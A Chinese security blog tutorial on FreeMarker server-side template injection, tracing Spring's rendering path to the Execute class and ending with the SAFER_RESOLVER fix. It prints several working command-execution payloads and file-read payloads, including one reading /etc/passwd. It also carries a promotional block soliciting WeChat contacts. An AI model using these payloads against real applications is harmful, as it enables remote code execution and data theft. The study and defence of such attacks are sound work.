## 0x01 前言

最近和 [F1or](https://f1or.cn/)大师傅一起挖洞的时候发现一处某 CMS SSTI 的 0day，之前自己在复现 jpress
的一些漏洞的时候也发现了 SSTI 这个洞杀伤力之大。今天来好好系统学习一手。

有三个最重要的模板，其实模板引擎本质上的原理差不多，因为在 SpringBoot 初学习的阶段我就已经学习过 Thymeleaf
了，所以大体上老生常谈的东西就不继续讲了。

三个模板的模板注入攻击差距其实还是有点大的，而且 Java 的 SSTI 和 Python Flask 的一些 SSTI 差距有点大。我们今天主要来看看
FreeMarker 的 SSTI

## 0x02 FreeMarker SSTI

FreeMarker 官网：<http://freemarker.foofun.cn/index.html>

对应版本是 2.3.23，一会儿我们搭建环境的时候也用这个版本

### FreeMarker 基础语法

关于文本与注释，本文不再强调，重点看插值与 FTL 指令。

#### 插值

插值也叫 Interpolation，即 `${..}`或者 `#{..}`格式的部分，将使用数据模型中的部分替代输出

比如这一个 .ftl 文件

    
    
    <!DOCTYPE html>    
    <html lang="en">    
    <head>    
    <meta charset="UTF-8">    
    <title>Hello ${name}!</title>    
    <link href="/css/main.css" rel="stylesheet">    
    </head>    
    <body>    
    <h2 class="hello-title">Hello ${name}!</h2>     
    <script src="/js/main.js"></script>    
    </body>    
    </html>

那么 `${name}`的数据就会从传参里面拿，对应的这个是在 `addAttribute`中的 name 参数

#### FTL 指令

FTL 指令以 `#`开头，其他语法和 HTML 大致相同。

> 我这里其实也花了不少时间看了 FreeMarker 的基础语法，但是并非很透彻，就不误人子弟了，有兴趣的师傅可以自己前往 FreeMarker
> 手册查看。

<https://freemarker.apache.org/>

### FreeMarker SSTI 成因与攻击面

看了一些文章，有些地方有所疏漏，先说 SSTI 的攻击面吧，我们都知道 SSTI 的攻击面其实是模板引擎的渲染，所以我们要让 Web 服务器将 HTML
语句渲染为模板引擎，前提是要先有 HTML 语句。那么 HTML 如何才能被弄上去呢？这就有关乎我们的攻击面了。

将 HTML 语句放到服务器上有两种方法：

1、文件上传 HTML 文件。

2、若某 CMS 自带有模板编辑功能，这种情况非常多。

因为之前有接触过 Thymeleaf 的 SSTI，Thymeleaf 的 SSTI 非常锋利， Thymeleaf SSTI
的攻击往往都是通过传参即可造成 RCE（当然这段话很可能是不严谨的

在刚接触 FreeMarker 的 SSTI 的时候，我误以为它和 Thyemelaf 一样，直接通过传参就可以打，后来发现我的想法是大错特错。

#### 环境搭建

一些开发的基本功，因篇幅限制，我也不喜放这些代码的书写，贴个项目地址吧

<https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/CodeReview>

#### 漏洞复现

前文我有提到，FreeMarker 的 SSTI 必须得是获取到 HTML，再把它转换成模板，从而引发漏洞，所以这里要复现，只能把 HTML 语句插入到
.ftl 里面，太生硬了简直。。。。。不过和 F1or 师傅一起挖出来的 0day 则是比较灵活，有兴趣的师傅可以滴一下我

payload：

    
    
    <#assign value="freemarker.template.utility.Execute"?new()>${value("Calc")}

![202211221329448.png](https://image.3001.net/images/20221122/1669099545_637c70191fdc26e30ede8.png!small)

  

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

  

构造出这个 PoC 的原因是 `freemarker.template.utility.Execute`类里面存在如下图所示的命令执行方法，都写到脸上来了。

![202211221329450.png](https://image.3001.net/images/20221122/1669099546_637c701a86dbed960bf72.png!small)

漏洞复现如图

![202211221329451.png](https://image.3001.net/images/20221122/1669099547_637c701be412bb9bf1c70.png!small)

#### 漏洞分析

我们要分析的是，MVC 的思维，以及如何走到这个危险类 ———— `freemarker.template.utility.Execute`去的。

下一个断点在
`org.springframework.web.servlet.view.UrlBasedViewResolver#createView`，开始调试

![202211221329452.png](https://image.3001.net/images/20221122/1669099549_637c701d58b23c5b5a516.png!small)

跟进 `super.createView()`

![202211221329453.png](https://image.3001.net/images/20221122/1669099551_637c701f0fe756e50d389.png!small)

进一步跟进 `loadView()`以及 `buildView()`，这些方法的业务意义都比较好理解，先 create 一个 View 视图，再将其
load 进来，最后再 build。

![202211221329454.png](https://image.3001.net/images/20221122/1669099552_637c7020856369abff293.png!small)

![202211221329455.png](https://image.3001.net/images/20221122/1669099554_637c70226b794ec33b645.png!small)

![202211221329456.png](https://image.3001.net/images/20221122/1669099556_637c702455492e82b7d1b.png!small)

在 `buildView()`方法当中，先通过 `this.instantiateView()`的方式 new 了一个
`FreeMarkerView`类，又进行了一些基础赋值，将我们的 View Build 了出来（也就是 View 变得有模有样了）

继续往下走，回到 `loadView()`方法，`loadView()`方法调用了 `view.checkResource()`方法

![202211221329457.png](https://image.3001.net/images/20221122/1669099558_637c7026088ffffbc62f7.png!small)

`checkResource()`方法做了两件事，第一件事是判断 `Resource`当中的 url 是否为空，也就是判断是否存在 resource，如果
url 都没东西，那么后续的模板引擎加载就更不用说了；第二件事是进行 `template`的获取，也可以把这理解为准备开始做模板引擎加载的业务了。

![202211221329458.png](https://image.3001.net/images/20221122/1669099560_637c702818ffd7c115d66.png!small)

跟进 `getTemplate()`方法

![202211221329459.png](https://image.3001.net/images/20221122/1669099561_637c7029961ef4adb7cdb.png!small)

首先做了一些赋值判断，再判断 Template 的存在，我们跟进 `this.cache.getTemplate`

![202211221329460.png](https://image.3001.net/images/20221122/1669099563_637c702b94827d939205f.png!small)

这里从 cache 里面取值，而在我们 `putTemplate`设置模板的时候，也会将至存储到 cache中。

跟进 `getTemplateInternal()`

![202211221329461.png](https://image.3001.net/images/20221122/1669099565_637c702d66343132bdc1b.png!small)

先做了一些基本的判断，到 202 行，跟进 `lookupTemplate()`方法

![202211221329462.png](https://image.3001.net/images/20221122/1669099567_637c702f67accdfe701a4.png!small)

这里代码很冗杂，最后的结果是跟进
`freemarker.cache.TemplateCache#lookupWithLocalizedThenAcquisitionStrategy

![202211221329463.png](https://image.3001.net/images/20221122/1669099569_637c70315690bd9a5da4b.png!small)

代码会先拼接 `_zh_CN`，再寻找未拼接 `_zh_CN`的模板名，调用 `this.findTemplateSource(path)`获取模板实例。

![202211221329464.png](https://image.3001.net/images/20221122/1669099571_637c70330b475dfd1cd54.png!small)

这里就获取到了 handle 执行返回的模板视图实例，这里我 IDEA 没有走过去，就跟着奶思师傅的文章先分析了。

`org.springframework.web.servlet.DispatcherServlet#doDispatch`流程

![202211221329465.png](https://image.3001.net/images/20221122/1669099572_637c703475a4625933ec2.png!small)

handle 执行完成后调用 `this.processDispatchResult(processedRequest, response,
mappedHandler, mv, (Exception)dispatchException);`进行模板解析。

![202211221329466.png](https://image.3001.net/images/20221122/1669099573_637c7035d9d8b9c88746c.png!small)

调用 `view.render(mv.getModelInternal(), request, response);`一路跟进至
`org.springframework.web.servlet.view.freemarker.FreeMarkerView#doRender`

![202211221329467.png](https://image.3001.net/images/20221122/1669099575_637c7037ca0daf98aaad5.png!small)

跟进 `this.processTemplate()`

![202211221329468.png](https://image.3001.net/images/20221122/1669099577_637c7039ca0253228c083.png!small)

跟进 `process()`

![202211221329469.png](https://image.3001.net/images/20221122/1669099579_637c703b3aa56e5a8cfac.png!small)

`process()`方法是做了一个输出（生成） HTML 文件或其他文件的工作，相当于渲染的最后一步了。

在 `process()`方法中，会对 ftl 的文件进行遍历，读取一些信息，下面我们先说对于正常语句的处理，再说对于 ftl 表达式的处理。

![202211221329470.png](https://image.3001.net/images/20221122/1669099580_637c703cb3bc22393ac0e.png!small)

> 在读取到每一条 freeMarker 表达式语句的时候，会二次调用 `visit()`方法，而 `visit()`方法又调用了
> `element.accept()`，跟进

![202211221329471.png](https://image.3001.net/images/20221122/1669099582_637c703e2212526c6a94e.png!small)

跟进 `calculateInterpolatedStringOrMarkup()`方法

![202211221329472.png](https://image.3001.net/images/20221122/1669099583_637c703fc1ad31f3c1a28.png!small)

`calculateInterpolatedStringOrMarkup()`方法做的业务是将模型强制为字符串或标记，跟进 `eval()`方法

![202211221329473.png](https://image.3001.net/images/20221122/1669099585_637c7041951fc4dbe9cbb.png!small)

`eval()`方法简单判断了 `constantValue`是否为 null，这里 `constantValue`为 null，跟进
`this._eval()`，一般的 `_eval()`方法只是将 evn 获取一下，但是对于 ftl 语句就不是这样了，一般的 `_eval()`方法如下

![202211221329475.png](https://image.3001.net/images/20221122/1669099587_637c704398c009cc5c539.png!small)

而对于 ftl 表达式来说，`accept`方法是这样的

![202211221329476.png](https://image.3001.net/images/20221122/1669099589_637c70453b656c34f964b.png!small)

跟进一下 `accept()`方法

![202211221329477.png](https://image.3001.net/images/20221122/1669099591_637c70473d9becae9240d.png!small)

做了一系列基础判断，先判断 `namespaceExp`是否为 null，接着又判断 `this.operatorType`是否等于 65536，到第
105 行，跟进 `eval()`方法，再跟进 `_eval()`

![202211221329478.png](https://image.3001.net/images/20221122/1669099592_637c70488e880f8084c7f.png!small)

![202211221329479.png](https://image.3001.net/images/20221122/1669099593_637c7049d3e6c4414cd37.png!small)

我们可以看到 `targetMethod`目前就是我们在 ftl 语句当中构造的那个能够进行命令执行的类，也就是说这一个语句相当于

    
    
    Object result = targetMethod.exec(argumentStrings);  
    ​  
    // 等价于  
    ​  
    Object result = freemarker.template.utility.Execute.exec(argumentStrings);

而这一步并非直接进行命令执行，而是先把这个类通过 `newInstance()`的方式进行初始化。

命令执行的参数，会被拿出来，在下一次的同样流程中作为命令被执行，如图

![202211221329480.png](https://image.3001.net/images/20221122/1669099595_637c704b781f64138e0b3.png!small)

至此，分析结束，很有意思的一个流程分析。

![202211221329481.png](https://image.3001.net/images/20221122/1669099597_637c704d01d6b505d38cc.png!small)

### FreeMarker SSTI 的攻防二象性

我们目前的 PoC 是这么打的

    
    
    <#assign value="freemarker.template.utility.Execute"?new()>${value("Calc")}

这是因为 FreeMarker 的内置函数 new 导致的，下面我们简单介绍一下 FreeMarker的两个内置函数—— `new`和 `api`

#### 内置函数 new

可创建任意实现了 `TemplateModel`接口的 Java 对象，同时还可以触发没有实现 `TemplateModel`接口的类的静态初始化块。
以下两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承 `TemplateModel`接口的
`freemarker.template.utility.JythonRuntime`和`freemarker.template.utility.Execute`

#### API

`value?api`提供对 value 的 API（通常是 Java API）的访问，例如 `value?api.someJavaMethod()`或
`value?api.someBeanProperty`。可通过 `getClassLoader`获取类加载器从而加载恶意类，或者也可以通过
`getResource`来实现任意文件读取。 但是，当`api_builtin_enabled`为 true 时才可使用 api 函数，而该配置在
**2.3.22 版本** 之后默认为 false。

由此我们可以构造出一系列的 bypass PoC

POC1

    
    
    <#assign classLoader=object?api.class.protectionDomain.classLoader>   
    <#assign clazz=classLoader.loadClass("ClassExposingGSON")>   
    <#assign field=clazz?api.getField("GSON")>   
    <#assign gson=field?api.get(null)>   
    <#assign ex=gson?api.fromJson("{}", classLoader.loadClass("freemarker.template.utility.Execute"))>   
    ${ex("Calc"")}

POC2

    
    
    <#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","Calc").start()}

POC3

    
    
    <#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc")

POC4

    
    
    <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("Calc") }

读取文件

    
    
    <#assign is=object?api.class.getResourceAsStream("/Test.class")>  
    FILE:[<#list 0..999999999 as _>  
    <#assign byte=is.read()>  
    <#if byte == -1>  
    <#break>  
    </#if>  
    ${byte}, </#list>]
    
    
    <#assign uri=object?api.class.getResource("/").toURI()>  
    <#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>  
    <#assign is=input?api.getInputStream()>  
    FILE:[<#list 0..999999999 as _>  
    <#assign byte=is.read()>  
    <#if byte == -1>  
    <#break>  
    </#if>  
    ${byte}, </#list>]

从 **2.3.17** 版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：
1、UNRESTRICTED_RESOLVER：可以通过 `ClassUtil.forName(className)`获取任何类。

2、SAFER_RESOLVER：不能加载
`freemarker.template.utility.JythonRuntime`、`freemarker.template.utility.Execute`、`freemarker.template.utility.ObjectConstructor`这三个类。
3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。
可通过`freemarker.core.Configurable#setNewBuiltinClassResolver`方法设置`TemplateClassResolver`，从而限制通过`new()`函数对`freemarker.template.utility.JythonRuntime`、`freemarker.template.utility.Execute`、`freemarker.template.utility.ObjectConstructor`这三个类的解析。

#### FreeMarker SSTI 修复

> 因为 FreeMarker 不能直接传参打，所以此处的代码参考奶思师傅。
    
    
    package freemarker;  
    ​  
    import freemarker.cache.StringTemplateLoader;  
    import freemarker.core.TemplateClassResolver;  
    import freemarker.template.Configuration;  
    import freemarker.template.Template;  
    ​  
    import java.io.IOException;  
    import java.io.OutputStreamWriter;  
    import java.io.StringWriter;  
    import java.util.HashMap;  
    ​  
    public class freemarker_ssti {  
    public static void main(String[] args) throws Exception {  
    ​  
    //设置模板  
    HashMap<String, String> map = new HashMap<String, String>();  
    String poc ="<#assign aaa=\"freemarker.template.utility.Execute\"?new()> ${ aaa(\"open -a Calculator.app\") }";  
    System.out.println(poc);  
    StringTemplateLoader stringLoader = new StringTemplateLoader();  
    Configuration cfg = new Configuration();  
    stringLoader.putTemplate("name",poc);  
    cfg.setTemplateLoader(stringLoader);  
    //cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);  
    //处理解析模板  
    Template Template_name = cfg.getTemplate("name");  
    StringWriter stringWriter = new StringWriter();  
    ​  
    Template_name.process(Template_name,stringWriter);  
    ​  
    ​  
    }  
    }  
    ​

防御成功

![202211221329482.png](https://image.3001.net/images/20221122/1669099599_637c704f372fc248c2bd1.png!small)

## 0x03 小结

比较其他两个模板引擎来说，FreeMarker 的 SSTI 更为严格一些，它的防护也做的相当有力，这个给自己挖个小坑吧，后续去看一看 FreeMarker
的代码当中是否存在强而有力的 bypass payload。

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

  

